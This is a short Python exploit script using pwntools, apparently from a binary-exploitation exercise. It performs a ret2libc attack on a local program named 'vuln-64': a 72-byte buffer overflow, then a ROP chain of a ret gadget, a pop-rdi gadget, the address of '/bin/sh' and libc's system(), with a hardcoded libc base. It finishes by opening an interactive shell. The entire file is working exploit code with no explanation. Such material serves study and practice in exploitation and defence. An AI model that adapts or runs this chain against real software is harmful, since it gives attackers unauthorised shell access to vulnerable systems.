#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-64')
p = process()

libc = elf.libc
libc.address = 0x7ffff7da3000

SYSTEM = libc.sym['system'] 
BINSH = next(libc.search(b'/bin/sh')) 

# LIBC_BASE = 0x7ffff7da3000
# SYSTEM = LIBC_BASE + 0x4a820
# BINSH = LIBC_BASE + 0x199def

POP_RDI = 0x4011cb

offset = 72

payload = flat(
    b'A' * 72,
    POP_RDI + 1,
    POP_RDI,
    BINSH,
    SYSTEM,
    0x0
)

p.clean()
p.sendline(payload)
p.interactive()
